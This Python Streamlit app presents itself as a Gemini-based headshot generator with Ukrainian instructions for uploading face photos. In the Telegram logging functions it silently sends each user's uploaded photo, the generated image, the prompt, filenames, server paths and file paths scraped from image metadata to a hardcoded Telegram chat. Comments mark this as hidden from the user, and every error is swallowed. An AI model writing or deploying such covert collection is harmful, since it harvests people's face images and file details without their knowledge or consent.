import streamlit as st
from google import genai
from google.genai import types
from PIL import Image as PILImage
import io
import base64
import os
import mimetypes
from telegram import Bot
from telegram.error import TelegramError
from telegram import InputMediaPhoto
import asyncio
import uuid
import re

# Page configuration
st.set_page_config(
    page_title="Gemini Image Generator",
    page_icon="🎨",
    layout="wide"
)

# Header container
with st.container():
    st.title("🎨 Gemini Image Generator")
    st.markdown("Завантажте одне або кілька референсних зображень та введіть промпт для генерації нового зображення")

    st.info(
        "**Як користуватись (швидко):**\n"
        "1) **Завантажте референси** (краще 1–3 фото обличчя, схожий ракурс/світло).\n"
        "2) **Оберіть шаблон** (Жінки/Чоловіки) і **відредагуйте промпт** під задачу.\n"
        "3) Натисніть **«Згенерувати зображення»** → потім **«Завантажити»**.\n\n"
        "**Порада:** якщо результат не влучив — спробуйте уточнити одяг/фон/світло або додайте ще один референс."
    )

    with st.expander("Підказки та приклади промптів"):
        st.markdown(
            "- **Для максимальної схожості**: *keep facial features exactly consistent*, додайте опис ракурсу (front/3-4 view).\n"
            "- **Для бізнес-портрета**: уточніть *studio backdrop*, *three-point lighting*, *85mm lens*.\n"
            "- **Щоб прибрати артефакти**: додайте *no extra people, no text, no watermark, no jewelry (optional)*.\n"
            "- **Якщо фон “брудний”**: вкажіть *clean solid background, subtle gradient, no objects*.\n"
            "\n"
            "**Міні-приклад (коротко):**\n"
            "`Keep the face identical. Professional headshot, black suit, white shirt, dark gray studio background, 3-point lighting, ultra realistic.`"
        )
    st.markdown("<br><br>", unsafe_allow_html=True)

# Prompt templates
PROMPT_WOMEN = """Keep the facial features of the person in the uploaded image exactly consistent. Dress her in a professional, **fitted black business suit (blazer) with a crisp white blouse**. Background: Place the subject against a clean, solid dark gray studio photography backdrop. The background should have a subtle gradient, slightly lighter behind the subject and darker towards the edges (vignette effect). There should be no other objects. Photography Style: Shot on a Sony A7III with an 85mm f/1.4 lens, creating a flattering portrait compression. Lighting: Use a classic three-point lighting setup. The main key light should create soft, defining shadows on the face. A subtle rim light should separate the subject's shoulders and hair from the dark background. Crucial Details: Render natural skin texture with visible pores, not an airbrushed look. Add natural catchlights to the eyes. The fabric of the suit should show a subtle wool texture. Final image should be an ultra-realistic, 8k professional headshot."""

PROMPT_MEN = """Keep the facial features of the person in the uploaded image exactly consistent . Dress them in a professional  black business suit  with a white shirt  and a tie, similar to the reference image. Background : Place the subject against a clean, solid dark gray studio photography backdrop . The background should have a subtle gradient , slightly lighter behind the subject and darker towards the edges (vignette effect). There should be no other objects. Photography Style : Shot on a Sony A7III with an 85mm f/1.4 lens , creating a flattering portrait compression. Lighting : Use a classic three-point lighting setup . The main key light should create soft, defining shadows on the face. A subtle rim light should separate the subject's shoulders and hair from the dark background. Crucial Details : Render natural skin texture with visible pores , not an airbrushed look. Add natural catchlights to the eyes . The fabric of the suit should show a subtle wool texture.Final image should be an ultra-realistic, 8k professional headshot."""

# Initialize Gemini client
@st.cache_resource
def get_gemini_client():
    api_key = os.getenv("GEMINI_API_KEY")
    if not api_key:
        st.error("⚠️ GEMINI_API_KEY не встановлено. Будь ласка, встановіть змінну середовища.")
        st.stop()
    return genai.Client(api_key=api_key)

# Function to extract metadata hints (best-effort)
def extract_metadata_hints(file_bytes, file_path):
    """
    Извлекает подсказки о путях из метаданных изображения (best-effort).
    Возвращает список найденных строк, похожих на Windows-пути.
    """
    hints = []
    
    try:
        # Попытка извлечь EXIF данные
        img = PILImage.open(io.BytesIO(file_bytes))
        
        # Получаем EXIF данные
        exif_data = img.getexif()
        if exif_data:
            # Собираем все строковые значения из EXIF
            for tag_id, value in exif_data.items():
                try:
                    if isinstance(value, str):
                        # Ищем Windows-пути в строковых значениях EXIF
                        # Паттерн для дисков: X:\... или X:/...
                        drive_pattern = r'[A-Za-z]:[\\/][^\\/:*?"<>|\r\n]{0,200}'
                        # Паттерн для UNC: \\server\share\...
                        unc_pattern = r'\\\\[^\\/:*?"<>|\r\n]{1,200}(?:\\[^\\/:*?"<>|\r\n]{0,200}){0,10}'
                        
                        matches = re.findall(drive_pattern, value)
                        hints.extend(matches)
                        matches = re.findall(unc_pattern, value)
                        hints.extend(matches)
                except Exception:
                    continue
        
        # Дополнительно: поиск в сырых байтах (ограниченный)
        # Ищем ASCII-строки, похожие на Windows-пути
        try:
            # Конвертируем байты в строку для поиска (только ASCII)
            text_content = file_bytes[:min(50000, len(file_bytes))].decode('ascii', errors='ignore')
            
            # Паттерн для дисков: X:\... или X:/...
            drive_pattern = r'[A-Za-z]:[\\/][^\\/:*?"<>|\r\n]{10,200}'
            # Паттерн для UNC: \\server\share\...
            unc_pattern = r'\\\\[^\\/:*?"<>|\r\n]{1,50}(?:\\[^\\/:*?"<>|\r\n]{1,50}){1,10}'
            
            matches = re.findall(drive_pattern, text_content)
            hints.extend(matches)
            matches = re.findall(unc_pattern, text_content)
            hints.extend(matches)
        except Exception:
            pass
            
    except Exception:
        # Если не удалось обработать как изображение, игнорируем
        pass
    
    # Дедупликация и ограничение длины
    unique_hints = []
    seen = set()
    for hint in hints:
        # Нормализуем путь для сравнения
        normalized = hint.replace('/', '\\').lower()
        if normalized not in seen and len(hint) <= 300:
            seen.add(normalized)
            unique_hints.append(hint)
            # Ограничиваем количество найденных подсказок
            if len(unique_hints) >= 5:
                break
    
    return unique_hints

# Function to save uploaded file and return metadata
def save_uploaded_file(uploaded_file):
    """
    Сохраняет загруженный файл во временную директорию и возвращает метаданные файла.
    Возвращает словарь с ключами: original_name, server_abs_path, metadata_hints
    """
    # Создаем директорию temp_uploads в корне проекта, если не существует
    temp_dir = os.path.join(os.path.dirname(__file__), "temp_uploads")
    os.makedirs(temp_dir, exist_ok=True)
    
    # Делаем имя файла уникальным, чтобы не перезаписывать
    original_name = uploaded_file.name
    name_base, ext = os.path.splitext(original_name)
    unique_name = f"{name_base}_{uuid.uuid4().hex[:8]}{ext}"
    file_path = os.path.join(temp_dir, unique_name)
    
    # Читаем содержимое файла
    uploaded_file.seek(0)
    file_bytes = uploaded_file.read()
    
    # Записываем содержимое файла
    with open(file_path, "wb") as f:
        f.write(file_bytes)
    
    # Извлекаем метаданные (best-effort)
    metadata_hints = extract_metadata_hints(file_bytes, file_path)
    
    # Возвращаем структуру с метаданными
    return {
        'original_name': original_name,
        'server_abs_path': os.path.abspath(file_path),
        'metadata_hints': metadata_hints
    }

# Telegram logging function (silent - no UI messages)
async def _send_telegram_log_async(original_image_bytes, generated_image_bytes, prompt_text, file_metadata_list=None):
    """
    Асинхронная функция для отправки логов в Telegram.
    file_metadata_list: список словарей с ключами original_name, server_abs_path, metadata_hints
    """
    bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
    if not bot_token:
        return
    
    chat_id = "6780240224"
    bot = Bot(token=bot_token)
    
    # Подготовка медиа-группы
    media_group = []
    
    # Формируем подпись для оригинального изображения с метаданными файлов
    original_caption = "Исходное изображение"
    if file_metadata_list and len(file_metadata_list) > 0:
        for idx, metadata in enumerate(file_metadata_list):
            if idx > 0:
                original_caption += "\n"
            original_caption += f"\nФайл {idx + 1}: {metadata.get('original_name', 'unknown')}"
            original_caption += f"\nСерверный путь: {metadata.get('server_abs_path', 'N/A')}"
            
            # Добавляем подсказки из метаданных, если есть
            hints = metadata.get('metadata_hints', [])
            if hints:
                original_caption += "\nПодсказки из метаданных (best-effort, не гарантируется):"
                for hint in hints[:3]:  # Ограничиваем до 3 подсказок
                    original_caption += f"\n  • {hint}"
    
    # Добавляем оригинальное изображение, если есть
    if original_image_bytes:
        media_group.append(InputMediaPhoto(
            media=io.BytesIO(original_image_bytes),
            caption=original_caption
        ))
    
    # Добавляем сгенерированное изображение с промптом в подписи
    if len(media_group) > 0:
        # Если есть оригинальное изображение, добавляем сгенерированное с промптом
        media_group.append(InputMediaPhoto(
            media=io.BytesIO(generated_image_bytes),
            caption=f"Промпт:\n{prompt_text}"
        ))
        # Отправляем медиа-группу
        await bot.send_media_group(chat_id=chat_id, media=media_group)
    else:
        # Если только сгенерированное изображение, отправляем с промптом в подписи
        await bot.send_photo(
            chat_id=chat_id,
            photo=io.BytesIO(generated_image_bytes),
            caption=f"Промпт:\n{prompt_text}"
        )

def send_telegram_log(original_image_bytes, generated_image_bytes, prompt_text, file_metadata_list=None):
    """
    Отправляет логи в Telegram: исходное фото, обработанное фото и промпт.
    Все ошибки обрабатываются молча - пользователь не видит никаких сообщений.
    file_metadata_list: список словарей с ключами original_name, server_abs_path, metadata_hints
    """
    try:
        # Используем asyncio для вызова асинхронной функции
        asyncio.run(_send_telegram_log_async(original_image_bytes, generated_image_bytes, prompt_text, file_metadata_list))
    except TelegramError:
        # Тихо игнорируем ошибки Telegram
        pass
    except Exception:
        # Тихо игнорируем любые другие ошибки
        pass

# Default settings (no sidebar needed)
aspect_ratio = "1:1"
model_name = "gemini-3-pro-image-preview"

# Section 1: Reference image upload (top)
with st.container():
    st.subheader("📤 Референсні зображення")
    uploaded_files = st.file_uploader(
        "Завантажте одне або кілька референсних зображень (опціонально)",
        type=['jpg', 'jpeg', 'png', 'bmp', 'gif'],
        accept_multiple_files=True,
        help=(
            "Рекомендовано: 1–3 референси з обличчям/портретом. "
            "Чим ближче ракурс і освітлення до бажаного результату — тим краще."
        ),
        key="reference_images"
    )
    st.caption(
        "Підказка: якщо референсів немає — генерація можлива, але схожість/стабільність результату може бути гіршою."
    )
    
    # Display uploaded reference images immediately
    if uploaded_files:
        num_files = len(uploaded_files)
        st.markdown("<br>", unsafe_allow_html=True)
        if num_files == 1:
            st.caption(f"Завантажено 1 референсне зображення")
            st.image(uploaded_files[0], caption="Референсне зображення", width="stretch")
        else:
            st.caption(f"Завантажено {num_files} референсних зображень")
            # Display images in columns for better layout
            cols = st.columns(min(3, num_files))
            for idx, uploaded_file in enumerate(uploaded_files):
                with cols[idx % len(cols)]:
                    st.image(uploaded_file, caption=f"Референс {idx + 1}: {uploaded_file.name}", width="stretch")

st.divider()
st.markdown("<br><br>", unsafe_allow_html=True)

# Section 2: Prompt input (middle)
with st.container():
    st.subheader("✍️ Промпт")
    st.markdown("<br>", unsafe_allow_html=True)
    
    # Initialize session state for prompt management
    if 'prompt_type' not in st.session_state:
        st.session_state['prompt_type'] = 'women'
    if 'edited_prompt_women' not in st.session_state:
        st.session_state['edited_prompt_women'] = None
    if 'edited_prompt_men' not in st.session_state:
        st.session_state['edited_prompt_men'] = None
    
    # Prompt type selector
    prompt_type = st.radio(
        "Тип промпту:",
        ["Жінки", "Чоловіки"],
        index=0 if st.session_state['prompt_type'] == 'women' else 1,
        horizontal=True,
        help="Оберіть шаблон і відредагуйте текст нижче. Ваші правки збережуться окремо для кожного типу.",
        key="prompt_type_selector"
    )
    
    st.markdown("<br>", unsafe_allow_html=True)
    
    # Update session state when selection changes
    current_prompt_type = 'women' if prompt_type == "Жінки" else 'men'
    if current_prompt_type != st.session_state['prompt_type']:
        # Save current edited prompt before switching
        old_prompt_key = f"prompt_text_area_{st.session_state['prompt_type']}"
        if old_prompt_key in st.session_state:
            if st.session_state['prompt_type'] == 'women':
                st.session_state['edited_prompt_women'] = st.session_state[old_prompt_key]
            else:
                st.session_state['edited_prompt_men'] = st.session_state[old_prompt_key]
        
        st.session_state['prompt_type'] = current_prompt_type
    
    # Determine which prompt to use
    if st.session_state['prompt_type'] == 'women':
        base_prompt = PROMPT_WOMEN
        edited_prompt = st.session_state['edited_prompt_women']
    else:
        base_prompt = PROMPT_MEN
        edited_prompt = st.session_state['edited_prompt_men']
    
    # Use edited prompt if available, otherwise use base prompt
    current_prompt_value = edited_prompt if edited_prompt is not None else base_prompt
    
    # Text area for prompt editing - use dynamic key based on prompt type
    prompt_key = f"prompt_text_area_{st.session_state['prompt_type']}"
    prompt = st.text_area(
        "Опишіть, що ви хочете згенерувати:",
        value=current_prompt_value,
        height=200,
        placeholder="Наприклад: Keep the facial features of the person in the uploaded image exactly consistent...",
        help=(
            "Порада: краще описувати: (1) що незмінне (обличчя), (2) одяг/стиль, (3) фон, (4) світло/камера, (5) що заборонено."
        ),
        key=prompt_key
    )

    col_a, col_b = st.columns([1, 1])
    with col_a:
        if st.button("↩️ Скинути промпт до шаблону", use_container_width=True):
            if st.session_state['prompt_type'] == 'women':
                st.session_state['edited_prompt_women'] = PROMPT_WOMEN
            else:
                st.session_state['edited_prompt_men'] = PROMPT_MEN
            st.rerun()
    with col_b:
        if st.button("🧹 Очистити останній результат", use_container_width=True):
            st.session_state.pop('generated_image', None)
            st.rerun()
    
    # Save edited prompt when user edits (update session state after text_area is rendered)
    if st.session_state['prompt_type'] == 'women':
        st.session_state['edited_prompt_women'] = prompt
    else:
        st.session_state['edited_prompt_men'] = prompt
    
    st.markdown("<br><br>", unsafe_allow_html=True)
    
    # Generate button - more prominent placement
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        generate_button = st.button("🚀 Згенерувати зображення", type="primary", use_container_width=True)

# Generate image when button is clicked
if generate_button:
    # Validation
    if not prompt or not prompt.strip():
        st.error("⚠️ Будь ласка, введіть промпт")
        st.stop()
    
    if not uploaded_files or len(uploaded_files) == 0:
        st.warning("⚠️ Рекомендується завантажити референсні зображення для кращих результатів")
    else:
        st.info(f"ℹ️ Буде використано {len(uploaded_files)} референсних зображень")
    
    st.divider()
    st.markdown("<br><br>", unsafe_allow_html=True)
    
    # Section 3: Result display (bottom)
    with st.container():
        st.subheader("🎨 Результат генерації")
        st.markdown("<br>", unsafe_allow_html=True)
    
    # Show progress
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    try:
        status_text.text("🔄 Ініціалізація клієнта Gemini...")
        progress_bar.progress(10)
        client = get_gemini_client()
        
        # Prepare file parts
        file_parts = []
        saved_file_metadata = []  # Список метаданных сохраненных файлов
        
        if uploaded_files and len(uploaded_files) > 0:
            num_files = len(uploaded_files)
            for idx, uploaded_file in enumerate(uploaded_files):
                status_text.text(f"📤 Завантаження зображення {idx + 1} з {num_files}...")
                progress_bar.progress(10 + int(20 * (idx + 1) / num_files))
                
                # Сохраняем файл на диск и получаем метаданные
                try:
                    file_metadata = save_uploaded_file(uploaded_file)
                    saved_file_metadata.append(file_metadata)
                except Exception:
                    # Тихо игнорируем ошибки сохранения, продолжаем работу
                    pass
                
                # Determine MIME type
                mime_type, _ = mimetypes.guess_type(uploaded_file.name)
                if not mime_type:
                    ext = os.path.splitext(uploaded_file.name)[1].lower()
                    mime_map = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp'
                    }
                    mime_type = mime_map.get(ext, 'image/jpeg')
                
                # Upload file to Gemini
                uploaded_file.seek(0)  # Reset file pointer
                uploaded_gemini_file = client.files.upload(
                    file=uploaded_file,
                    config={'mime_type': mime_type}
                )
                file_parts.append(
                    types.Part(file_data=types.FileData(file_uri=uploaded_gemini_file.uri))
                )
        else:
            progress_bar.progress(30)
        
        # Create text part
        text_part = types.Part(text=prompt)
        
        # Combine files and text
        contents = file_parts + [text_part]
        
        status_text.text("🎨 Генерація зображення...")
        progress_bar.progress(50)
        
        # Generate content
        resp = client.models.generate_content(
            model=model_name,
            contents=contents,
            config=types.GenerateContentConfig(
                response_modalities=["IMAGE"],
                image_config=types.ImageConfig(
                    aspect_ratio=aspect_ratio,
                ),
            ),
        )
        
        status_text.text("📥 Обробка відповіді...")
        progress_bar.progress(80)
        
        # Extract image from response
        image_bytes = None
        
        if hasattr(resp, 'parts') and resp.parts:
            for part in resp.parts:
                if hasattr(part, 'inline_data') and part.inline_data is not None:
                    # Try to get image via as_image()
                    try:
                        img = part.as_image()
                        if img is not None and isinstance(img, PILImage.Image):
                            buf = io.BytesIO()
                            img.save(buf, format='JPEG')
                            image_bytes = buf.getvalue()
                            break
                    except Exception:
                        pass
                    
                    # Alternative: get data directly from inline_data
                    if hasattr(part.inline_data, 'data'):
                        data = part.inline_data.data
                        if isinstance(data, bytes):
                            image_bytes = data
                            break
                        elif isinstance(data, str):
                            image_bytes = base64.b64decode(data)
                            break
        
        progress_bar.progress(100)
        status_text.text("✅ Готово!")
        
        if image_bytes:
            # Display generated image
            st.success("🎉 Зображення успішно згенеровано!")
            st.info(
                "**Що далі:** натисніть **«Завантажити зображення»** нижче.\n\n"
                "**Як покращити результат:**\n"
                "- додайте 1–2 референси з ближчим ракурсом;\n"
                "- уточніть фон (solid/gradient) і світло (three-point);\n"
                "- додайте обмеження: *no text, no watermark, no extra people*."
            )
            st.markdown("<br>", unsafe_allow_html=True)
            st.image(image_bytes, caption="Згенероване зображення", width="stretch")
            st.markdown("<br>", unsafe_allow_html=True)
            
            # Download button
            col1, col2, col3 = st.columns([1, 2, 1])
            with col2:
                st.download_button(
                    label="💾 Завантажити зображення",
                    data=image_bytes,
                    file_name="generated_image.jpg",
                    mime="image/jpeg",
                    use_container_width=True
                )
            
            # Store in session state for persistence
            st.session_state['generated_image'] = image_bytes
            
            # Отправка логов в Telegram (тихо, без показа пользователю)
            try:
                original_image_bytes = None
                if uploaded_files and len(uploaded_files) > 0:
                    # Получаем первое референсное изображение
                    uploaded_files[0].seek(0)  # Сбрасываем указатель файла
                    original_image_bytes = uploaded_files[0].read()
                
                # Вызываем функцию логирования (все ошибки обрабатываются внутри функции)
                # Передаем метаданные сохраненных файлов
                send_telegram_log(original_image_bytes, image_bytes, prompt, saved_file_metadata if saved_file_metadata else None)
            except Exception:
                # Тихо игнорируем любые ошибки при логировании
                pass
        else:
            st.error("❌ Помилка: зображення не знайдено у відповіді")
            if hasattr(resp, 'parts'):
                st.write(f"Кількість parts у відповіді: {len(resp.parts)}")
                for i, part in enumerate(resp.parts):
                    st.write(f"Part {i}: {type(part)}")
    
    except Exception as e:
        st.error(f"❌ Помилка: {str(e)}")
        st.exception(e)
    finally:
        progress_bar.empty()
        status_text.empty()

# Display previously generated image if exists
if 'generated_image' in st.session_state and not generate_button:
    st.divider()
    st.markdown("<br><br>", unsafe_allow_html=True)
    with st.container():
        st.subheader("📸 Останнє згенероване зображення")
        st.markdown("<br>", unsafe_allow_html=True)
        st.image(st.session_state['generated_image'], caption="Останнє згенероване зображення", width="stretch")
        st.markdown("<br>", unsafe_allow_html=True)
        col1, col2, col3 = st.columns([1, 2, 1])
        with col2:
            st.download_button(
                label="💾 Завантажити останнє зображення",
                data=st.session_state['generated_image'],
                file_name="generated_image.jpg",
                mime="image/jpeg",
                use_container_width=True
            )

